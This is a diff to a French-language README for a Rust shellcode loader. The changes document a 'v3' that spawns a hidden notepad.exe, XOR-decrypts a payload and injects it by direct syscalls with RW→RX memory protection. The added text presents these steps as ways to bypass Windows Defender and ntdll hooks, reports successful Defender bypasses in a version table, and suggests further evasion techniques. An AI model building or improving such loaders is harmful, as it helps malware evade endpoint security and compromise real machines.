@@ -24,13 +24,16 @@ Avec les **direct syscalls**, on bypass ces DLLs en faisant l'appel système dir
            Pas de hook possible !
 ```
 
-### Syscalls Utilisés
+### Syscalls Utilisés (v3)
 
 | Syscall | Description |
 |---------|-------------|
-| `NtAllocateVirtualMemory` | Alloue de la mémoire dans le processus |
-| `NtWriteVirtualMemory` | Écrit des données dans la mémoire allouée |
-| `NtCreateThreadEx` | Crée un thread pour exécuter le shellcode |
+| `NtOpenProcess` | Ouvre le processus cible (notepad.exe) avec droits minimum |
+| `NtAllocateVirtualMemory` | Alloue de la mémoire RW dans le processus cible |
+| `NtWriteVirtualMemory` | Écrit le shellcode dans la mémoire distante |
+| `NtProtectVirtualMemory` | Change la protection mémoire RW → RX |
+| `NtCreateThreadEx` | Crée un thread distant pour exécuter le shellcode |
+| `NtClose` | Ferme les handles (process et thread) |
 
 ## 🛠️ Installation
 
@@ -105,21 +108,39 @@ loader_rust/
 └── README.md           # Ce fichier
 ```
 
-### Architecture du Loader
+### Architecture du Loader v3
 
 ```rust
-fn execute_shellcode(shellcode: &[u8]) {
-    // 1. Allouer mémoire RWX
-    syscall!("NtAllocateVirtualMemory", ...)
+fn main() {
+    // 1. Spawn notepad.exe (hidden)
+    let pid = spawn_notepad_syscall();
     
-    // 2. Copier shellcode en mémoire
-    syscall!("NtWriteVirtualMemory", ...)
+    // 2. Inject shellcode
+    inject_shellcode(pid, &ENCRYPTED_SHELLCODE);
+}
+
+fn inject_shellcode(pid: u32, shellcode: &[u8]) {
+    // XOR decrypt
+    let decrypted = xor_decrypt(shellcode, &XOR_KEY);
     
-    // 3. Créer thread pour exécuter
+    // Open target process (minimum rights!)
+    syscall!("NtOpenProcess", pid, 0x002A)  // Not PROCESS_ALL_ACCESS!
+    
+    // Allocate RW memory in target
+    syscall!("NtAllocateVirtualMemory", PAGE_READWRITE)
+    
+    // Write shellcode (full syscall!)
+    syscall!("NtWriteVirtualMemory", shellcode)  // Not copy_nonoverlapping!
+    
+    // Change to RX
+    syscall!("NtProtectVirtualMemory", PAGE_EXECUTE_READ)
+    
+    // Create remote thread
     syscall!("NtCreateThreadEx", ...)
     
-    // 4. Attendre la fin du thread
-    syscall!("NtWaitForSingleObject", ...)
+    // Cleanup with syscalls
+    syscall!("NtClose", thread_handle)
+    syscall!("NtClose", process_handle)
 }
 ```
 
@@ -175,10 +196,24 @@ cargo +nightly build --release --target x86_64-pc-windows-gnu
 
 ### Windows Defender bloque l'exécution
 
-C'est normal ! Le shellcode est détecté. Pour tester :
-1. Désactivez temporairement Windows Defender
-2. Utilisez une VM isolée
-3. Ajoutez une exclusion pour le dossier de test
+Avec la v3, le loader devrait bypass Defender grâce à :
+- XOR encryption du shellcode (pas de signature statique)
+- Process injection (shellcode pas dans le loader)
+- Direct syscalls (bypass hooks ntdll)
+- RW→RX (pas de RWX suspect)
+
+Si toujours détecté :
+1. Vérifiez que le shellcode est bien chiffré
+2. Utilisez une VM isolée pour tester
+3. Considérez d'autres techniques (indirect syscalls, sleep obfuscation)
+
+## 🛡️ Versions
+
+| Version | Techniques | Détection Defender |
+|---------|------------|--------------------|
+| v1 | Direct syscalls | ❌ Détecté |
+| v2 | + XOR + RW→RX | ✅ Bypass |
+| v3 | + Process injection + NtWriteVirtualMemory + NtClose | ✅ Bypass |
 
 ## ⚖️ Disclaimer
 
